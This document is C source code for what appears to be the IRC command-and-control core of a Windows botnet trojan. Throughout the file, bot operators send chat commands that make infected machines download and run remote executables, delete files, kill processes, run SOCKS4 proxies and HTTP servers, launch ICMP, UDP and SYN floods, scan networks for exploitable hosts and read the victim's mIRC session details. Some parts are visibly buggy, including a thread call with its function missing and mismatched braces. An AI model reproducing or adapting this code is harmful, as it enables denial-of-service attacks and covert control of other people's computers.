#include "include.h"
#include "extern.h"

#ifndef NO_MIRCCMD //taken from sp0rkeh
BOOL bMircSent;
BOOL CALLBACK mirc(HWND hWnd, LPARAM param)
{
	HANDLE hFileMap;
	char *mData;
	char wClass[512];

	GetClassName(hWnd, wClass, 512);
	if(!strcmpi(wClass, "mIRC"))
	{
		hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, 4096, "mIRC");
		mData = (char *)MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

		wsprintf(mData, "%s", param);
		SendMessage(hWnd, (WM_USER + 200), 1, 0);

		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);
		bMircSent=TRUE;
	}

	return TRUE;
}


BOOL CALLBACK mirc32(HWND hWnd, LPARAM param)
{
	HANDLE hFileMap;
	char *mData;
	char wClass[512];

	GetClassName(hWnd, wClass, 512);
	if(!strcmpi(wClass, "mIRC32"))
	{
		hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, 4096, "mIRC32");
		mData = (char *)MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

		wsprintf(mData, "%s", param);
		SendMessage(hWnd, (WM_USER + 200), 1, 0);

		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);
		bMircSent=TRUE;
	}

	return TRUE;
}

BOOL SendIrcCommand(const char *str)
{
	bMircSent=FALSE;
	fEnumWindows((WNDENUMPROC)mirc, (LPARAM)str);
	fEnumWindows((WNDENUMPROC)mirc32, (LPARAM)str);
	return bMircSent;
}
#endif

char *irc_rndnick()
/* generates a random nickname */
{
	int i;
	int len;
	char *nick = (char *)malloc(12);
	len = rrand(6, 8);
	for(i = 0; i < len; i++)
		nick[i] = rrand(97, 122);
	nick[i] = '\0';
	return nick;
}

bool irc_connect()
/* connect to the irc server */
{
	int y;
	int s;
	char nick[12];
	unsigned long ip;
	struct sockaddr_in sin;
	closesocket(irc.sock);
	if((irc.sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return false;
	for(y = 0; server[y][0]; y++)
		;
	y--;
	s = rrand(0, y);
	if(isip(server[s]))
		ip = inet_addr(server[s]);
	else
		ip = resolvehost(server[s]);
	if(!ip)
		return false;
	sin.sin_family = AF_INET;
	sin.sin_port = htons((unsigned short)atoi(port));
	sin.sin_addr.s_addr = ip;
	memset(sin.sin_zero, 0, 8);
	if(connect(irc.sock, (struct sockaddr *)&sin, sizeof(sin)) == -1)
		return false;
	strncpy(nick, irc_rndnick(), sizeof(nick));
	irc_send("USER %s \"\" \"\" :%s", nick, nick);
	irc_send("NICK %s", nick);
	if(serverpass[0])
		irc_send("PASS %s", serverpass);
	strncpy(local_ip, localip(irc.sock), sizeof(local_ip));
	return true;
}

void irc_send(const char *msg, ...)
/* send data to the server */
{
	char buf[256];
	va_list argp;
	va_start(argp, msg);
	_vsnprintf(buf, sizeof(buf) - 2, msg, argp);
	strcat(buf, "\r\n");
	send(irc.sock, buf, strlen(buf), 0);
}

void irc_privmsg(const char *target, const char *msg, ...)
/* send a privmsg to server */
{
	char buf[256];
	char buf2[256];
	va_list argp;
	va_start(argp, msg); 
	_vsnprintf(buf, sizeof(buf), msg, argp);
	_snprintf(buf2, sizeof(buf2), "PRIVMSG %s :%s\r\n", target, buf);
	send(irc.sock, buf2, strlen(buf2), 0);
}

void irc_getinfo(const char *address)
{
	strncpy(irc.nick, gettok(address, 1, '!'), sizeof(irc.nick));
	strncpy(irc.user, gettok(address, 1, '@'), sizeof(irc.user));
	strncpy(irc.user, gettok(address, 2, '!'), sizeof(irc.user));
	strncpy(irc.host, gettok(address, 2, '@'), sizeof(irc.host));
}

void irc_parse(const char *line)
/* parse line for commands */
{
	int nt;
	int tok;
	char target[64];
	char *a[32];
	bool param[256];
	memset(a, 0, sizeof(a));
	memset(param, 0, sizeof(param));
	nt = numtok(line, ' ');
	if(nt > 32)
		nt = 32;
	for(tok = 0; tok < nt; tok++)
		a[tok] = gettok(line, tok + 1, ' ');
	for(tok--; tok >= 1; tok--)
	{
		if(a[tok][0] == '-' && !a[tok][2])
		{
			param[a[tok][1]] = true;
			a[tok] = 0;
		}
	}
	if(!stricmp("PING", a[0]))
		irc_send("PONG %s", a[1]);
	if(!a[1])
		return;
	a[0]++;
	if(!stricmp("001", a[1]))
	{
		strncpy(irc.me, a[2], sizeof(irc.me));
		irc_send("USERHOST %s", irc.me);
		irc_send("JOIN %s %s", channel, chankey);
	}
	else if(!stricmp("302", a[1]))
	{
		a[3]++;
		if(!stricmp(irc.me, gettok(a[3], 1, '=')))
		{
			if(isip(gettok(a[3], 2, '@')))
			{
				char *host;
				strncpy(global_ip, gettok(a[3], 2, '@'), sizeof(global_ip));
				host = resolveip(inet_addr(global_ip));
				if(!host)
					return;
				strncpy(global_host, (host) ? host : global_ip, sizeof(global_host));
			}
			else
			{
				struct in_addr in;
				in.s_addr = resolvehost(global_host);
				if(!in.s_addr)
					return;
				strncpy(global_host, gettok(a[3], 2, '@'), sizeof(global_host));
				strncpy(global_ip, inet_ntoa(in), sizeof(global_ip));
			}
		}
	}
	else if(!stricmp("433", a[1]))
		irc_send("NICK %s", irc_rndnick());
	else if(!stricmp("NICK", a[1]))
	{
		a[2]++;
		irc_getinfo(a[0]);
		if(!stricmp(irc.me, irc.nick))
			strncpy(irc.me, a[2], sizeof(irc.me));
	}
	else if(!stricmp("KICK", a[1]))
	{
		if(!stricmp(irc.me, a[3]))
		{
			if(!stricmp(channel, a[2]))
				irc_send("JOIN %s %s", a[2], chankey);
		}
	}
	else if(!stricmp("PRIVMSG", a[1]) || !stricmp("332", a[1]))
	{
		int x;
		if(!stricmp("PRIVMSG", a[1]))
		{
			a[3]++;
			irc_getinfo(a[0]);
			if(!stricmp(irc.me, a[2]))
				strncpy(target, irc.nick, sizeof(target));
			else
				strncpy(target, a[2], sizeof(target));
			if(!stricmp(irc.me, a[3]))
				x = 4;
			else
				x = 3;
		}
		else if(!stricmp("332", a[1]))
		{
			a[4]++;
			if(!a[4])
				return;
			strncpy(target, a[3], sizeof(target));
			x = 4;
		}
		if(strcmp(hostauth, gettok(a[0], 2, '!')) && stricmp("332", a[1]))
			return;
		if(!stricmp("!ID", a[x]))
		/* oh man, irc sucks!!! */
		{
			irc_privmsg(target, "irc sucks dude..");
			Sleep(3000);
			irc_privmsg(target, "%s", botid);
		}
		else if(!stricmp("!UPTIME", a[x]))
		{
			unsigned long total;
			unsigned long days;
			unsigned long hours;
			unsigned long minutes;
			total = GetTickCount() / 1000;
			days = total / 86400;
			if(!a[x+1] || days >= (unsigned)atol(a[x+1]))
			{
				hours = (total % 86400) / 3600;
				minutes = (total % 86400 % 3600) / 60;
				irc_privmsg(target, "%lud %luh %lum", days, hours, minutes);
			}
		}
		else if(!stricmp("!SYSINFO", a[x]))
			irc_privmsg(target, "%s", sysinfo());
		else if(!stricmp("!NETINFO", a[x]))
			irc_privmsg(target, "%s", netinfo());
		else if(!stricmp("!RECONNECT", a[x]))
			irc_send("QUIT");
		else if(!stricmp("!DIE", a[x]))
		{
			killthreadall();
			irc_send("QUIT");
			exit(0);
		}
		else if(!stricmp("!UNINSTALL", a[x]))
		{
			if(a[x+1])
			{
				if(!strcmp(botid, a[x+1]))
					return;
			}
			killthreadall();
			irc_send("QUIT");
			uninstall();
		}
		else if(!stricmp("!OPEN", a[x]))
		{
			char s[256];
			char s2[256];
			if(!a[x+1])
				return;
			_snprintf(s2, sizeof(s2), " %s", a[x+1]);
			strncpy(s, strstr(line, s2), sizeof(s));
			_snprintf(s2, sizeof(s2), "%s", a[x+1]);
			strncpy(s, strstr(s, s2), sizeof(s));
			ShellExecute(0, "open", s, 0, 0, SW_SHOW);
			irc_privmsg(target, "OPENED FILE %s", s2);
		}
		else if(!stricmp("!DELETE", a[x]))
		{
			char s[256];
			char s2[256];
			if(!a[x+1])
				return;
			_snprintf(s2, sizeof(s2), " %s", a[x+1]);
			strncpy(s, strstr(line, s2), sizeof(s));
			_snprintf(s2, sizeof(s2), "%s", a[x+1]);
			strncpy(s, strstr(s, s2), sizeof(s));
			DeleteFile(s);
		irc_privmsg(target, "DELETED FILE %s.", a[x+1]);
		}
		else if(!stricmp("!RAW", a[x]))
		{
			char s[256];
			char s2[256];
			if(!a[x+1])
				return;
			_snprintf(s2, sizeof(s2), " %s", a[x+1]);
			strncpy(s, strstr(line, s2), sizeof(s));
			_snprintf(s2, sizeof(s2), "%s", a[x+1]);
			strncpy(s, strstr(s, s2), sizeof(s));
			irc_send("%s", s);
			irc_privmsg(target, "RAW: %s", s);
		}
		else if(!stricmp("!DOWNLOAD", a[x]))
		{
			struct dls dl;
			if(!a[x+2])
				return;
			strncpy(dl.url, a[x+1], sizeof(dl.url));
			strncpy(dl.dest, a[x+2], sizeof(dl.dest));
			dl.update = false;
			dl.run = param['r'];
			dl.gotinfo = false;
			if((dl.tnum = addthread("download", dl.url)) == -1)
				return;
			if(!(thread[dl.tnum].handle = CreateThread(0, 131072, download, &dl, 0, 0)))
				return;
			while(!dl.gotinfo)
				Sleep(10);
			irc_privmsg(target, "DOWNLOADING FILE %s to %s", a[x+1], a[x+2]);
		}
		else if(!stricmp("!UPDATE", a[x]))
		{
			char s[256];
			char s2[256];
			if(!a[x+1])
				return;
			_snprintf(s2, sizeof(s2), " %s", a[x+1]);
			strncpy(s, strstr(line, s2), sizeof(s));
			_snprintf(s2, sizeof(s2), "%s", a[x+1]);
			strncpy(s, strstr(s, s2), sizeof(s));
			char file[12];
			char tempdir[256];
			struct dls dl;
			if(!a[x+1])
				return;
			if(a[x+2])
			{
				if(!strcmp(botid, a[x+2]))
					return;
			}
			GetTempPath(sizeof(tempdir), tempdir);
			strncpy(dl.url, a[x+1], sizeof(dl.url));
			strncpy(file, irc_rndnick(), sizeof(file));
			_snprintf(dl.dest, sizeof(dl.dest), "%s%s.exe", tempdir, file);
			dl.update = true;
			dl.run = false;
			dl.gotinfo = false;
			if((dl.tnum = addthread("update", dl.url)) == -1)
				return;
			if(!(thread[dl.tnum].handle = CreateThread(0, 131072, download, &dl, 0, 0)))
				return;
			while(!dl.gotinfo)
				Sleep(10);
				irc_privmsg(target, "Downloaded to DIR:%s and executed: %s.exe", tempdir, file);
				ShellExecute(0, "open %s%s", s, 0, 0, SW_SHOW);

		}
		else if(!stricmp("!THRDLIST", a[x]))
		{
			//fixme listthreads() does not wrok.
			irc_privmsg(target, "%s", listthreads);
			listthreads(target);
		}
		else if(!stricmp("!THRDKILL", a[x]))
		{
			if(!a[x+1])
				return;
			killthread(a[x+1]);
			irc_privmsg(target, "Killed thread %s", a[x+1]);
		}
		else if(!stricmp("!THRDKILLID", a[x]))
		{
			if(!a[x+1])
				return;
			killthreadid(atoi(a[x+1]));
			irc_privmsg(target, "Killed thread id %s", a[x+1]);
		}
		else if(!stricmp("!THRDKILLALL", a[x]))
		{
			killthreadall();
			irc_privmsg(target, "Killed all threads.");
		}
		else if(!stricmp("!PSLIST", a[x]))
			pslist("", target);
		else if(!stricmp("!PSKILL", a[x]))
		{
			if(!a[x+1])
				return;
			pslist(a[x+1], "");
				irc_privmsg(target, "Killed process %s", a[x+1]);
		}
		else if(!stricmp("!PSKILLPID", a[x]))
		{
			if(!a[x+1])
				return;
			pskill(atoi(a[x+1]));
			irc_privmsg(target, "KILLED (pid) %s", a[x+1]);
		}
		else if(!stricmp("!SOCKS4START", a[x]))
		{
			struct socks4s socks4;
			if(!a[x+1])
				return;
			if(socks4_active)
				return;
			socks4_active = true;
			socks4.port = (unsigned short)atoi(a[x+1]);
			socks4.gotinfo = false;
			if((socks4.tnum = addthread("socks4", a[x+1])) == -1)
				return;
			if(!(thread[socks4.tnum].handle = CreateThread(0, 131072, socks4_start, &socks4, 0, 0)))
				return;
			while(!socks4.gotinfo)
				Sleep(10);
				irc_privmsg(target, "SOCKS4 ON IP: %s PORT: %s", global_ip, a[x+1]);
		}
		else if(!stricmp("!SOCKS4STOP", a[x]))
		{
			killthread("socks4");
			irc_privmsg(target, "STOPPED SOCKS4");
		}
		else if(!stricmp("!HTTPDSTART", a[x]))
		{
			char sysdir[256];
			struct httpds httpd;
			if(!a[x+1])
				return;
			if(httpd_active)
				return;
			httpd_active = true;
			httpd.port = (unsigned short)atoi(a[x+1]);
			GetSystemDirectory(sysdir, sizeof(sysdir));
			_splitpath(sysdir, httpd.dir, 0, 0, 0);
			httpd.gotinfo = false;
			if((httpd.tnum = addthread("httpd", a[x+1])) == -1)
				return;
			if(!(thread[httpd.tnum].handle = CreateThread(0, 131072, http_start, &httpd, 0, 0)))
				return;
			while(!httpd.gotinfo)
				Sleep(10);
				irc_privmsg(target, "HTTPD started on %s:%s\r\n", global_ip, a[x+1]);
		}
		else if(!stricmp("!HTTPDSTOP", a[x]))
		{
			killthread("httpd");
			killthread("httpds");
			irc_privmsg(target, "ERROR HTTPD CAN NOT BE STOPPED.");
			}
		else if(!stricmp("!DDOSICMP", a[x]))
		{
			struct icmps icmp;
			if(!a[x+2])
				return;
			strncpy(icmp.host, a[x+1], sizeof(icmp.host));
			icmp.time = atoi(a[x+2]);
			icmp.fullspoof = param['f'];
			icmp.gotinfo = false;
			if((icmp.tnum = addthread("icmpflood", icmp.host)) == -1)
				return;
			if(!(thread[icmp.tnum].handle = CreateThread(0, 131072, icmpflood, &icmp, 0, 0)))
				return;
			while(!icmp.gotinfo)
				Sleep(10);
				irc_privmsg(target, "ICMP-Flooding %s for %s seconds.", a[x+1], a[x+2]);
		}
		else if(!stricmp("!DDOSUDP", a[x]))
		{
			struct udps udp;
			if(!a[x+3])
				return;
			strncpy(udp.host, a[x+1], sizeof(udp.host));
			udp.port = (unsigned short)atoi(a[x+2]);
			udp.time = (unsigned short)atoi(a[x+3]);
			udp.fullspoof = param['f'];
			udp.gotinfo = false;
			if((udp.tnum = addthread("udpflood", udp.host)) == -1)
				return;
			if(!(thread[udp.tnum].handle = CreateThread(0, 131072, udpflood, &udp, 0, 0)))
				return;
			while(!udp.gotinfo)
				Sleep(10);
				irc_privmsg(target, "UDP-Flooding %s on port %s for %s seconds.", a[x+1], a[x+2], a[x+3]);
		}
		else if(!stricmp("!DDOSSYN", a[x]))
		{
			struct syns syn;
			if(!a[x+3])
				return;
			strncpy(syn.host, a[x+1], sizeof(syn.host));
			syn.port = (unsigned short)atoi(a[x+2]);
			syn.time = (unsigned short)atoi(a[x+3]);
			syn.fullspoof = param['f'];
			syn.gotinfo = false;
			if((syn.tnum = addthread("synflood", syn.host)) == -1)
				return;
			if(!(thread[syn.tnum].handle = (0, 131072, synflood, &syn, 0, 0)))
				return;
			while(!syn.gotinfo)
				Sleep(10);
			irc_privmsg(target, "%s SYN-Flooding %s on port %s for %s seconds.", channel, a[x+1], a[x+2], a[x+3]);
		}
		else if(!stricmp("!DDOSSTOP", a[x]))
		{
			killthread("icmpflood");
			killthread("udpflood");
			killthread("synflood");
			irc_privmsg(target, "DDOS FLOOD HAS STOPPED"); 
		}
		else if(!stricmp("!mircinfo", a[x]))
		{
			
		HWND mwnd = FindWindow("mIRC", NULL);
		if (mwnd)
		{
			HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,"mIRC");
			LPSTR mData = (LPSTR)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
		   		char mircversion[20000], mircnick[20000], ircserver[20000], ircserverip[20000], ircport[20000], channels[20000];
			ZeroMemory(ircserverip,sizeof(ircserverip));
			sprintf(mData,"$serverip");
			SendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(ircserverip,sizeof(ircserverip),"%s", mData);
				// mirc version
			ZeroMemory(mircversion,sizeof(mircversion));
			sprintf(mData,"$version");
			SendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(mircversion,sizeof(mircversion),"%s", mData);

			// mirc nick
			ZeroMemory(mircnick,sizeof(mircnick));
			sprintf(mData,"$me");
			SendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(mircnick,sizeof(mircnick),"%s", mData);

			// irc server
			ZeroMemory(ircserver,sizeof(ircserver));
			sprintf(mData,"$server");
			SendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(ircserver,sizeof(ircserver),"%s", mData);
				// irc port
			ZeroMemory(ircport,sizeof(ircport));
			sprintf(mData, "$port");
			SendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(ircport,sizeof(ircport),"%s", mData);

			// channels
			ZeroMemory(channels,sizeof(channels));
			char numchans[16];
			sprintf(mData,"$chan(0)");
			SendMessage(mwnd,WM_USER + 201,1,0);
			_snprintf(numchans,sizeof(numchans),mData);
			for (int i=1;i <= atoi(numchans);i++) {
				sprintf(mData,"$chan(%i)",i);
				SendMessage(mwnd,WM_USER + 201,1,0);
 				strcat(channels,mData);
 				if (i < atoi(numchans)) strcat(channels,", ");
				if (i == atoi(numchans)) strcat(channels,".");
			}

			irc_privmsg(target,"User is running mIRC %s, connected to %s (%s:%s) using the nick: %s, on channels: %s", mircversion, ircserver, ircserverip, ircport, mircnick, channels);
			UnmapViewOfFile(mData);
			CloseHandle(hFileMap);
	}
	else if(!stricmp("!SCANSTART", a[x]))
		{
			int ca;
			int cb;
			int cc;
			int cd;
			int speed;
			struct scans scan;
			if(!a[x+2])
				return;
			if(scan_active)
				return;
			scan_active = true;
			if(!stricmp("asn", a[x+1]))
			{
				scan.port = 139;
				scan.port2 = 0;
				scan.port3 = 0;
				strncpy(scan.exploit, "asn", sizeof(scan.exploit));
				irc_privmsg(target, "%s SCANNING: %s delay: %s started on ip: %s", channel, scan.exploit, scan.delay, scan.sock);
			}
			else if(!stricmp("netapi", a[x+1]))
			{
				scan.port = 139;
				scan.port2 = 135;
				scan.port3 = 445;
				strncpy(scan.exploit, "netapi", sizeof(scan.exploit));
				irc_privmsg(target, "%s SCANNING: %s delay: %s started on ip: %s", channel, scan.exploit, scan.delay, scan.sock);
			}
			else
			{
				if(!(scan.port = (unsigned short)atoi(a[x+1])))
				{
					scan_active = false;
					return;
				}
				scan.port2 = 135;
				scan.port3 = 445;
				memset(scan.exploit, 0, sizeof(scan.exploit));
			}
			speed = atoi(a[x+2]);
			switch(speed)
			{
				case 1:
					scan.delay = 100;
					break;
				case 2:
					scan.delay = 50;
					break;
				case 3:
					scan.delay = 20;
					break;
				default:
					break;
			}
			if(a[x+3])
				strncpy(scan.mask, a[x+3], sizeof(scan.mask));
			else
			{
				sscanf(local_ip, "%d.%d.%d.%d", &ca, &cb, &cc, &cd);
				if(param['a'])
					_snprintf(scan.mask, sizeof(scan.mask), "%d.x.x.x", ca);
				else if(param['b'])
					_snprintf(scan.mask, sizeof(scan.mask), "%d.%d.x.x", ca, cb);
				else if(param['c'])
					_snprintf(scan.mask, sizeof(scan.mask), "%d.%d.%d.x", ca, cb, cc);
				else
					_snprintf(scan.mask, sizeof(scan.mask), "%d.%d.x.x", ca, cb);
			}
	        transfers = param['i'];
			scan.gotinfo = false;
			if((scan.tnum = addthread("scan", scan.mask)) == -1)
			{
				scan_active = false;
				return;
			}
			thread[scan.tnum].scan = true;
	        if(!(thread[scan.tnum].handle = CreateThread(0, 131072, scan_start, &scan, 0, 0)))
			{
				irc_privmsg(target, "%s SCANNING: %s delay: %s started on ip: %s", channel, scan.exploit, scan.delay, scan.sock);
				clearthread(scan.tnum);
				return;
			}
			irc_privmsg(target, "%s SCANNING: %s delay: %s started on ip: %s", channel, scan.exploit, scan.delay, scan.sock);
			while(!scan.gotinfo)
				Sleep(10);
	}
		else if(!stricmp("!SCANSTOP", a[x]))
		{
			killthread("scan");
			irc_privmsg(target, "Scanning stopped, Transfers: %d", transfers);
						Sleep(10);
		}
		else if(!stricmp("!SCANSTATS", a[x]))
		{
			if(!a[x+1] || transfers > atoi(a[x+1]))
				irc_privmsg(target, "transfers: %d", transfers);
		}
		else if(!stricmp("!PSCANSTART", a[x]))
			{
			int speed;
			struct pscans pscan;
			if(!a[x+4])
				return;
			if(scan_active)
				return;
			scan_active = true;
			pscan.startp = (unsigned short)atoi(a[x+1]);
			pscan.endp = (unsigned short)atoi(a[x+2]);
			speed = atoi(a[x+3]);
			switch(speed)
			{
				case 1:
					pscan.delay = 100;
					break;
				case 2:
					pscan.delay = 50;
					break;
				case 3:
					pscan.delay = 20;
					break;
				default:
					break;
			}
			pscan.ip = inet_addr(a[x+4]);
			strncpy(pscan.target, a[x-1], sizeof(pscan.target));
			pscan.gotinfo = false;
			pscan.tnum = addthread("pscan", a[x+4]);
			irc_privmsg(target, "pscan started on %s, ports %hu-%hu", a[x+4], pscan.startp, pscan.endp);
			if(!(thread[pscan.tnum].handle = CreateThread(0, 131072, pscan_start, &pscan, 0, 0)))
				return;
			while(!pscan.gotinfo)
				Sleep(10);
				irc_privmsg(target, "pscan started on %s, ports %hu-%hu", a[x+4], pscan.startp, pscan.endp);
		}
		else if(!stricmp("!PSCANSTOP", a[x]))
		{
			killthread("pscan");
		irc_privmsg(target, "pscan stopped");
		}
		
	}
}
}
